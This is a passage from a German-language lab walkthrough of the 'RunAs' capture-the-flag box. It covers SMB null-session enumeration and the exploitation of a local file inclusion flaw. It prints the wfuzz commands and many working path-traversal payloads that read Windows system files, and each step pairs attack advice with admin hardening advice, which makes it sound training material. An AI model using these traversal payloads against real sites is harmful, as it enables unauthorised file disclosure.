+                <strong>Analyse:</strong> Ich nutze <code>enum4linux</code> mit den Optionen <code>-a</code> (alle Standardtests) und <code>-Av</code> (ausführliche Benutzer- und Gruppen-Enumeration über RID-Cycling), um detaillierte Informationen &uuml;ber SMB/NetBIOS zu sammeln. Die Ausgabe best&auml;tigt die <span class="command">WORKGROUP</span> und den Computernamen <span class="command">RUNAS-PC</span>. Es zeigt auch, dass der Server <span class="password">allows sessions using username '', password ''</span> (Null-Session), was potenziell f&uuml;r Informationsabfragen genutzt werden kann. Jedoch scheitern viele spezifische Enumerationstests (<code>lsarpc</code>, <code>srvsvc</code>, Benutzerabfragen &uuml;ber <code>querydispinfo</code> und <code>enumdomusers</code>, Share Enumeration) mit <span class="password">NT_STATUS_ACCESS_DENIED</span> oder <span class="password">NT_STATUS_RESOURCE_NAME_NOT_FOUND</span>. RID cycling ist ebenfalls nicht m&ouml;glich.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Obwohl eine Null-Session erlaubt ist, scheinen detaillierte Enumerationstests &uuml;ber SMB ohne Authentifizierung nicht zu funktionieren. Dies schränkt den direkten Nutzen von enum4linux ein. Informationen &uuml;ber Benutzerkonten oder Freigaben m&uuml;ssen wahrscheinlich auf anderem Wege gefunden werden (z.B. &uuml;ber die Web-Schwachstelle).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> F&uuml;hre SMB-Enumerationstests durch, aber sei bereit, alternative Methoden zu nutzen, wenn der anonyme Zugriff eingeschränkt ist. Konzentriere dich auf Vektoren, die funktionieren.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere Null-Sessions. Stelle sicher, dass anonyme SMB-Zugriffe stark eingeschränkt sind und keine sensiblen Informationen oder detaillierte Systemstruktur verraten. Härte SMB allgemein ab.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">enum4linux -a 192.168.2.67 -Av</span>                  
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+Starting enum4linux v0.9.1 ( [Link: http://labs.portcullis.co.uk/application/enum4linux/ | Ziel: http://labs.portcullis.co.uk/application/enum4linux/] ) on Sun Jun 29 22:27:44 2025
+
+ =========================================(<span class="command"> Target Information </span>)=========================================
+
+Target ........... <span class="command">192.168.2.67</span>
+RID Range ........ <span class="command">500-550,1000-1050</span>
+Username ......... <span class="command">''</span>
+Password ......... <span class="command">''</span>
+Known Usernames .. <span class="command">administrator, guest, krbtgt, domain admins, root, bin, none</span>
+
+
+ ============================(<span class="command"> Enumerating Workgroup/Domain on 192.168.2.67 </span>)============================
+
+
+<span class="password">[+] Got domain/workgroup name: WORKGROUP</span>
+
+
+ ================================(<span class="command"> Nbtstat Information for 192.168.2.67 </span>)================================
+
+Looking up status of <span class="command">192.168.2.67</span>
+	<span class="command">RUNAS-PC        &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span>
+	<span class="command">RUNAS-PC        &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span>
+	<span class="command">WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span>
+	<span class="command">WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span>
+	<span class="command">WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span>
+	<span class="command">..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span>
+
+	<span class="command">MAC Address = 08-00-27-4F-41-93</span>
+
+ ===================================(<span class="command"> Session Check on 192.168.2.67 </span>)===================================
+
+
+<span class="password">[+] Server 192.168.2.67 allows sessions using username '', password ''</span>
+
+
+ ================================(<span class="command"> Getting domain SID for 192.168.2.67 </span>)================================
+
+do_cmd: <span class="password">Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED</span>
+
+<span class="password">[+] Can't determine if host is part of domain or part of a workgroup</span>
+
+
+ ===================================(<span class="command"> OS information on 192.168.2.67 </span>)===================================
+
+
+<span class="password">[E] Can't get OS info with smbclient</span>
+
+
+<span class="password">[+] Got OS info for 192.168.2.67 from srvinfo:</span> 
+do_cmd: <span class="password">Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED</span>
+
+
+ =======================================(<span class="command"> Users on 192.168.2.67 </span>)=======================================
+
+
+<span class="password">[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED</span>
+
+
+
+<span class="password">[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED</span>
+
+
+ =================================(<span class="command"> Share Enumeration on 192.168.2.67 </span>)=================================
+
+do_connect: <span class="password">Connection to 192.168.2.67 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span>
+
+	Sharename       Type      Comment
+	---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+
+<span class="password">[+] Attempting to map shares on 192.168.2.67</span>
+
+
+ ============================(<span class="command"> Password Policy Information for 192.168.2.67 </span>)============================
+
+
+<span class="password">[E] Unexpected error from polenum:</span>
+
+
+
+<span class="password">[+] Attaching to 192.168.2.67 using a NULL share</span>
+
+<span class="password">[+] Trying protocol 139/SMB...</span>
+
+	<span class="password">[!] Protocol failed: Cannot request session (Called Name:192.168.2.67)</span>
+
+<span class="password">[+] Trying protocol 445/SMB...</span>
+
+	<span class="password">[!] Protocol failed: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.</span>
+
+
+
+<span class="password">[E] Failed to get password policy with rpcclient</span>
+
+
+
+ =======================================(<span class="command"> Groups on 192.168.2.67 </span>)=======================================
+
+
+<span class="password">[+] Getting builtin groups:</span>
+
+
+<span class="password">[+] Getting builtin group memberships:</span>
+
+
+<span class="password">[+] Getting local groups:</span>
+
+
+<span class="password">[+] Getting local group memberships:</span>
+
+
+<span class="password">[+] Getting domain groups:</span>
+
+
+<span class="password">[+] Getting domain group memberships:</span>
+
+
+ ==================(<span class="command"> Users on 192.168.2.67 via RID cycling (RIDS: 500-550,1000-1050) </span>)==================
+
+
+<span class="password">[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED. RID cycling not possible.</span>
+
+
+ ===============================(<span class="command"> Getting printer info for 192.168.2.67 </span>)===============================
+
+do_cmd: <span class="password">Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED</span>
+
+
+enum4linux complete on Sun Jun 29 22:27:45 2025
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich versuche direkt mit <code>smbclient -L //192.168.2.67 -N</code>, die Shares auf dem Zielsystem anonym aufzulisten. Der <code>-N</code> Parameter weist smbclient an, keine Passwortabfrage durchzuführen (Null-Session). Die Ausgabe zeigt &quot;Anonymous login successful&quot;, aber die anschließenden Versuche, die Shares über SMB1 abzurufen, schlagen mit <span class="password">NT_STATUS_RESOURCE_NAME_NOT_FOUND</span> fehl.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieses Ergebnis best&auml;tigt die Erkenntnisse aus enum4linux: Eine anonyme SMB-Sitzung kann hergestellt werden, aber der Zugriff auf detaillierte Informationen oder Shares ist ohne Authentifizierung nicht m&ouml;glich. Dies bedeutet, dass SMB/NetBIOS wahrscheinlich nicht der direkte Weg zum Initial Access ist, sondern eher f&uuml;r Post-Exploitation n&uuml;tzlich sein k&ouml;nnte, wenn Anmeldedaten gefunden werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Teste anonyme SMB-Zugriffe und Share-Auflistung, aber investiere nicht zu viel Zeit hier, wenn der Zugriff stark eingeschränkt ist. Konzentriere dich auf andere vielversprechendere Dienste.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere Null-Sessions, wenn nicht unbedingt notwendig. Beschr&auml;nke anonymen Zugriff auf SMB streng.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">smbclient -L //192.168.2.67 -N</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="password">Anonymous login successful</span>
+
+	Sharename       Type      Comment
+	---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: <span class="password">Connection to 192.168.2.67 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span>
+Unable to connect with SMB1 -- no workgroup available
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Hier die Initial Access-Schritte einfügen -->
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich untersuche die Hauptwebseite auf Port 80 (<code>http://runas.hmv/index.php</code>). Der Titel "Index of /" aus Nmap deutete auf Directory Listing hin. Ich rufe die Seite mit <code>curl http://runas.hmv/index.php</code> auf (nicht direkt gezeigt, aber durch den nachfolgenden Log-Eintrag impliziert). Das Ergebnis zeigt offensichtlich die Seite, die einen Parameter namens `file` erwartet. Der Text &quot;There is no going back! ?file=&quot; auf der Seite ist ein klarer Hinweis auf eine m&ouml;gliche Local File Inclusion (LFI) Schwachstelle. Die Anwendung scheint zu versuchen, den Inhalt einer Datei, deren Pfad im `file`-Parameter übergeben wird, anzuzeigen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Entdeckung der LFI-Schwachstelle &uuml;ber den `file`-Parameter ist ein signifikanter Fund und der prim&auml;re Weg zum Initial Access. Eine erfolgreiche LFI erm&ouml;glicht das Lesen beliebiger Dateien auf dem Server, was zur Preisgabe sensibler Informationen (Konfigurationen, Passw&ouml;rter, etc.) oder sogar zur Remote Code Execution f&uuml;hren kann (z.B. durch Inkludieren von Log-Dateien, in die zuvor b&ouml;sartiger Code injiziert wurde).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Teste Webanwendungen immer auf g&auml;ngige Schwachstellen wie LFI/RFI, SQL Injection, XSS etc. Achte auf URL-Parameter, die Dateinamen oder Pfade annehmen. Nutze die LFI, um Systemdateien wie /etc/passwd (Linux) oder C:\Windows\System32\drivers\etc\hosts (Windows) zu lesen und das System zu erkunden.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere strikte Eingabevalidierung und Sanit&auml;tisierung f&uuml;r alle Benutzer-eingaben, insbesondere f&uuml;r Dateinamen oder Pfade. Vermeide die direkte &Uuml;bergabe von Benutzer-eingaben an Dateisystemfunktionen. Konfiguriere Webserver so, dass sie keine Fehlermeldungen anzeigen, die Dateipfade preisgeben. Nutze ein WAF, das LFI-Angriffe erkennt und blockiert.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="command">http://runas.hmv/index.php</span>
+<span class="command">There is no going back!</span>
+<span class="command">?file=</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich teste die identifizierte LFI-Schwachstelle, indem ich versuche, eine bekannte Systemdatei zu lesen. Ich verwende den URL <code>http://runas.hmv/index.php?file=/etc/passwd</code>, wobei ich bewusst einen Linux-Pfad w&auml;hle, um zu sehen, wie das System reagiert. Die Ausgabe &quot;There is no going back! ?file= File not found!&quot; zeigt die gleiche urspr&uuml;ngliche Seite mit dem zus&auml;tzlichen Text <span class="password">File not found!</span>. Dies best&auml;tigt, dass der LFI-Parameter funktioniert, aber der angegebene Pfad nicht gefunden wurde, was zu erwarten war, da es sich um ein Windows-System handelt und Linux-Pfade nicht gültig sind.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der &quot;File not found!&quot;-Fehler ist eine positive Best&auml;tigung, dass die Anwendung den `file`-Parameter verarbeitet und auf das Dateisystem zugreift. Die LFI-Schwachstelle ist real, und ich muss nun die korrekte Pfadsyntax f&uuml;r Windows-Dateien finden und m&ouml;glicherweise Pfad-Traversal-Techniken anwenden, um aus dem Web-Root-Verzeichnis auszubrechen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nachdem LFI best&auml;tigt ist, experimentiere mit verschiedenen Pfadsyntaxen (Windows vs. Linux, absolute vs. relative Pfade) und Path-Traversal-Techniken (<code>../</code>, <code>..\</code>, kodierte Varianten) sowie Dateisystem-Wrappern (<code>file://</code>, <code>php://filter</code> etc.).
+                <br><strong>Empfehlung (Admin):</strong> Die Fehlermeldung &quot;File not found!&quot; ist informativ und best&auml;tigt die Schwachstelle. Konfiguriere die Anwendung so, dass sie bei ung&uuml;ltigen Dateizugriffen generische Fehlermeldungen ausgibt.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="command">http://runas.hmv/index.php?file=/etc/passwd</span>
+
+<span class="command">There is no going back!</span>
+<span class="command">?file=</span>
+<span class="password">File not found!</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Um die korrekte Pfadsyntax und die erforderliche Anzahl von Path-Traversal-Schritten (<code>../</code>) zu finden, nutze ich das Fuzzing-Tool <code>wfuzz</code>. Der Befehl <code>wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &quot;http://runas.hmv/index.php?FUZZ=file:///../../../../../../../../../../../../../../../../../etc/passwd&quot; --hc 404 --hh 414</code> versucht, den `FUZZ` Platzhalter in der URL mit Einträgen aus der Wortliste zu ersetzen. In diesem spezifischen Log-Auszug scheint der Befehl modifiziert worden zu sein, um Path-Traversal-Sequenzen vor einem bekannten Dateipfad (<code>/etc/passwd</code> - wahrscheinlich als Platzhalter oder f&uuml;r ein Linux-System getestet) einzufügen. Der <code>--hc 404 --hh 414</code> Filter weist wfuzz an, Antworten mit Statuscode 404 oder Content-Länge 414 (die Gr&ouml;&szlig;e der "File not found!" Seite) zu ignorieren, um nur Treffer anzuzeigen, bei denen die Datei erfolgreich gelesen wurde. Die Ausgabe zeigt einen <span class="password">200 OK</span> Treffer (ID 000000748) f&uuml;r die Payload &quot;<span class="command">file</span>&quot; mit einer Antwortgr&ouml;&szlig;e von <span class="command">429 Chars</span>. Dies best&auml;tigt, dass die Verwendung des <code>file://</code> Wrappers und eine ausreichende Anzahl von <code>../</code> Schritten es erlauben, Dateien zu lesen. Die spezifische Payload in der Ausgabe ist etwas unklar, aber der Kontext zeigt, dass Path-Traversal in Kombination mit <code>file://</code> erfolgreich ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der erfolgreiche wfuzz-Test best&auml;tigt, dass die LFI-Schwachstelle &uuml;ber den <code>file://</code> Wrapper und Path-Traversal ausnutzbar ist. Ich kann nun beliebige Dateien auf dem System lesen, solange ich den korrekten relativen Pfad vom Web-Root (C:\Apache24\htdocs) kenne und das PHP-Skript Lesezugriff hat. Dies ist ein kritischer Durchbruch.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze Path-Traversal-Fuzzing, um die notwendige Anzahl von Schritten zum Dateisystem-Root oder bekannten Systemverzeichnissen zu finden. Experimentiere mit verschiedenen Encodings und Wrappern (<code>file://</code>, <code>php://filter</code>).
+                <br><strong>Empfehlung (Admin):</strong> Implementiere Path-Traversal-Erkennung und -Blockierung in einem WAF. Begrenze die Dateizugriffsberechtigungen f&uuml;r den Webserver-Prozess auf das absolut Notwendige und auf sein Web-Root-Verzeichnis.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &quot;http://runas.hmv/index.php?FUZZ=file:///../../../../../../../../../../../../../../../../../etc/passwd&quot; --hc 404 --hh 414</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+
+Target: <span class="command">http://runas.hmv/index.php?FUZZ=file:///../../../../../../../../../../../../../../../../../etc/passwd</span>
+Total requests: <span class="command">220548</span>
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                      
+=====================================================================
+
+<span class="command">000000748</span>:   <span class="password">200</span>        <span class="command">17 L</span>     <span class="command">35 W</span>       <span class="command">429 Ch</span>      &quot;<span class="command">file</span>&quot;                       
+
+Total time: <span class="command">0</span>
+Processed Requests: <span class="command">220548</span>
+Filtered Requests: <span class="command">220547</span>
+Requests/sec.: <span class="command">0</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach der Best&auml;tigung der LFI und des <code>file://</code> Wrappers setze ich wfuzz erneut ein, diesmal mit einer anderen Wortliste (logfiles.txt, die Pfade zu g&auml;ngigen Log-Dateien und Konfigurationen enth&auml;lt) und konzentriere mich darauf, verschiedene Systemdateien &uuml;ber die LFI-Schwachstelle auszulesen. Der Befehl <code>wfuzz -c -w /usr/share/wordlists/logfiles.txt -u &quot;http://runas.hmv/index.php?file=file:///../../../../../../../../../../../../../../../../FUZZ&quot; --hc 404 --hh 414</code> verwendet wieder die Path-Traversal-Sequenz und f&uuml;gt den Wortlisteneintrag dort ein, wo die Zieldatei erwartet wird. Die Ausgabe zeigt zahlreiche <span class="password">200 OK</span> Treffer f&uuml;r verschiedene Dateipfade, darunter <span class="command">windows/system32/drivers/etc/hosts</span>, <span class="command">php/php.ini</span>, <span class="command">windows/windowsupdate.log</span> etc. Dies zeigt, dass ich &uuml;ber die LFI-Schwachstelle auf viele Systemdateien zugreifen kann. Beachte die verschiedenen Encodings und Path-Traversal-Varianten (<code>../</code>, <code>..\</code>, <code>//</code>, <code>\../</code>, URL-Enkodierung wie <code>%2e%2e%5c</code> etc.) in den gefundenen Payloads, was die Robustheit der Schwachstelle zeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Das gezielte LFI-Fuzzing war &auml;u&szlig;erst erfolgreich und hat mir eine Liste lesbarer Systemdateien geliefert. Dies ist ein kritischer Schritt f&uuml;r die Informationssammlung und Privilegieneskalation. Dateien wie <code>php.ini</code>, <code>hosts</code> und <code>windowsupdate.log</code> enthalten oft wertvolle Konfigurationsinformationen, Benutzernamen oder sogar Passw&ouml;rter oder Hinweise auf andere Schwachstellen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze automatisierte LFI-Tools wie wfuzz mit passenden Wortlisten, um lesbare Dateien systematisch zu identifizieren. Lade die gefundenen Dateien herunter und analysiere sie gr&uuml;ndlich auf sensible Informationen oder weitere Schwachstellen.
+                <br><strong>Empfehlung (Admin):</strong> Die F&auml;higkeit, so viele Systemdateien &uuml;ber LFI zu lesen, ist kritisch. Stelle sicher, dass die LFI-Schwachstelle vollst&auml;ndig behoben wird. Pr&uuml;fe Dateisystemberechtigungen f&uuml;r den Webserver-Benutzer. Implementiere ein Intrusion Detection System, das aggressive LFI-Fuzzing-Versuche erkennt.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">wfuzz -c -w /usr/share/wordlists/logfiles.txt -u &quot;http://runas.hmv/index.php?file=file:///../../../../../../../../../../../../../../../../FUZZ&quot; --hc 404 --hh 414</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="command">000041896</span>:   <span class="password">200</span>        <span class="command">19 L</span>     <span class="command">55 W</span>       <span class="command">583 Ch</span>      &quot;<span class="command">.%00.%f8%80%80%80%afetc%f8%80%80%80%afpasswd</span>&quot;                                                                               
+<span class="command">000044807</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">%5C../%5C../windows/system32/drivers/etc/hosts</span>&quot;                                                                             
+<span class="command">000044803</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">%5C../windows/system32/drivers/etc/hosts</span>&quot;                                                                                   
+<span class="command">000044839</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">%5C..\%5C..\%5C..\%5C..\windows\system32\drivers\etc\hosts</span>&quot;                                                                 
+<span class="command">000044831</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">%5C..\%5C..\windows\system32\drivers\etc\hosts</span>&quot;                                                                             
+<span class="command">000044835</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">%5C..\%5C..\%5C..\windows\system32\drivers\etc\hosts</span>&quot;                                                                       
+<span class="command">000044823</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">%5C../%5C../%5C../%5C../%5C../%5C../windows/system32/drivers/etc/hosts</span>&quot;                                                     
+<span class="command">000044827</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">%5C..\windows\system32\drivers\etc\hosts</span>&quot;                                                                                      
+<span class="command">000044883</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">%5C..%5c%5C..%5c%5C..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts</span>&quot;                                                         
+<span class="command">000044875</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">%5C..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts</span>&quot;                                                                         
+<span class="command">000045559</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">.%2e\.%2e\.%2e\.%2e\windows\system32\drivers\etc\hosts</span>&quot;                                                                     
+<span class="command">000045551</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">.%2e\.%2e\windows\system32\drivers\etc\hosts</span>&quot;                                                                               
+<span class="command">000045555</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">.%2e\.%2e\.%2e\windows\system32\drivers\etc\hosts</span>&quot;                                                                          
+<span class="command">000045547</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">.%2e\windows\system32\drivers\etc\hosts</span>&quot;                                                                                                                
+<span class="command">000060643</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">..//windows//system32//drivers//etc//hosts</span>&quot;                                                                                                   
+<span class="command">000060763</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">..\/windows\/system32\/drivers\/etc\/hosts</span>&quot;                                                                                                                       
+<span class="command">000060855</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">\../\../\../\../\../\../windows/\system32/\drivers/\etc/\hosts</span>&quot;                                                             
+<span class="command">000060879</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">/..\/..\/..\/..\/..\/..\windows\/system32\/drivers\/etc\/hosts</span>&quot;                                                             
+<span class="command">000060931</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">./../windows/system32/drivers/etc/hosts</span>&quot;                                                                                                                   
+<span class="command">000061363</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">\\\..\windows\\\system32\\\drivers\\\etc\\\hosts</span>&quot;                                                                           
+<span class="command">000061367</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">\\\..\..\windows\\\system32\\\drivers\\\etc\\\hosts</span>&quot;                                                                        
+<span class="command">000061359</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">\\\../../../../../../windows\\\system32\\\drivers\\\etc\\\hosts</span>&quot;                                                            
+<span class="command">000061351</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">\\\../../../../windows\\\system32\\\drivers\\\etc\\\hosts</span>&quot;                                                                  
+<span class="command">000061355</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">\\\../../../../../windows\\\system32\\\drivers\\\etc\\\hosts</span>&quot;                                                               
+<span class="command">000061375</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">\\\..\..\..\..\windows\\\system32\\\drivers\\\etc\\\hosts</span>&quot;                                                                  
+<span class="command">000061347</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">\\\../../../windows\\\system32\\\drivers\\\etc\\\hosts</span>&quot;                                                                     
+<span class="command">000061420</span>:   <span class="password">200</span>        <span class="command">19 L</span>     <span class="command">55 W</span>       <span class="command">583 Ch</span>      &quot;<span class="command">..\..\etc\passwd%00index.html</span>&quot;                                                                                              
+<span class="command">000061421</span>:   <span class="password">200</span>        <span class="command">19 L</span>     <span class="command">55 W</span>       <span class="command">583 Ch</span>      &quot;<span class="command">..\..\etc\passwd%00index.htm</span>&quot;                                                                                               
+<span class="command">000061379</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">\\\..\..\..\..\..\windows\\\system32\\\drivers\\\etc\\\hosts</span>&quot;                                                        
+<span class="command">000070604</span>:   <span class="password">200</span>        <span class="command">1928 L</span>   <span class="command">12417 W</span>    <span class="command">85387 Ch</span>    &quot;<span class="command">php/php.ini</span>&quot;                                                                                                                
+<span class="command">000071517</span>:   <span class="password">200</span>        <span class="command">33 L</span>     <span class="command">105 W</span>      <span class="command">946 Ch</span>      &quot;<span class="command">windows/system32/drivers/etc/networks</span>&quot;                                                                                      
+<span class="command">000071518</span>:   <span class="password">200</span>        <span class="command">44 L</span>     <span class="command">232 W</span>      <span class="command">1973 Ch</span>     &quot;<span class="command">windows/system32/drivers/etc/protocol</span>&quot;                                                                                      
+<span class="command">000071516</span>:   <span class="password">200</span>        <span class="command">96 L</span>     <span class="command">700 W</span>      <span class="command">4760 Ch</span>     &quot;<span class="command">windows/system32/drivers/etc/lmhosts.sam</span>&quot;                                                                                   
+<span class="command">000071515</span>:   <span class="password">200</span>        <span class="command">38 L</span>     <span class="command">189 W</span>      <span class="command">1375 Ch</span>     &quot;<span class="command">windows/system32/drivers/etc/hosts</span>&quot;                                                                                         
+<span class="command">000071519</span>:   <span class="password">200</span>        <span class="command">302 L</span>    <span class="command">1569 W</span>     <span class="command">19622 Ch</span>    &quot;<span class="command">windows/system32/drivers/etc/services</span>&quot;                                                                                      
+<span class="command">000071526</span>:   <span class="password">200</span>        <span class="command">17 L</span>     <span class="command">33 W</span>       <span class="command">425 Ch</span>      &quot;<span class="command">windows/setuperr.log</span>&quot;                                                                                                       
+<span class="command">000071529</span>:   <span class="password">200</span>        <span class="command">1170 L</span>   <span class="command">13297 W</span>    <span class="command">108051 Ch</span>   &quot;<span class="command">windows/windowsupdate.log</span>&quot;                                                                                                  
+<span class="command">000071524</span>:   <span class="password">200</span>        <span class="command">313 L</span>    <span class="command">2051 W</span>     <span class="command">25712 Ch</span>    &quot;<span class="command">windows/setupact.log</span>&quot;                                                                                                       
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich teste das Auslesen einer spezifischen Systemdatei, der <code>hosts</code>-Datei unter Windows (<code>C:\Windows\System32\drivers\etc\hosts</code>), über die LFI-Schwachstelle. Ich verwende den URL <code>http://runas.hmv/index.php?file=file:///../../../../../../../../../../../../../../../../../windows/system32/drivers/etc/hosts</code> mit dem `file://` Wrapper und einer ausreichenden Anzahl von `../` Schritten, um zum System-Root zu gelangen und dann den Pfad zur Datei anzugeben. Die Ausgabe zeigt den Inhalt der Standard Windows `hosts`-Datei.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das erfolgreiche Auslesen der `hosts`-Datei mit LFI best&auml;tigt die volle Ausnutzbarkeit der Schwachstelle. Ich kann nun im Prinzip jede Datei lesen, auf die der Webserver-Prozess Zugriff hat. Dies ist ein kritischer Punkt, der weitreichende Informationssammlung erm&ouml;glicht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die F&auml;higkeit, beliebige Dateien zu lesen, um Systemkonfigurationen, Logs (auf Hinweise auf Benutzer, Passw&ouml;rter, Fehler), Quellcode der Anwendung oder andere sensible Daten zu sammeln.
+                <br><strong>Empfehlung (Admin):</strong> Behebe die LFI-Schwachstelle umgehend. &Uuml;berpr&uuml;fe die Dateisystemberechtigungen des Webserver-Benutzers, um sicherzustellen, dass er keinen unn&ouml;tigen Lesezugriff auf Systemdateien hat.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
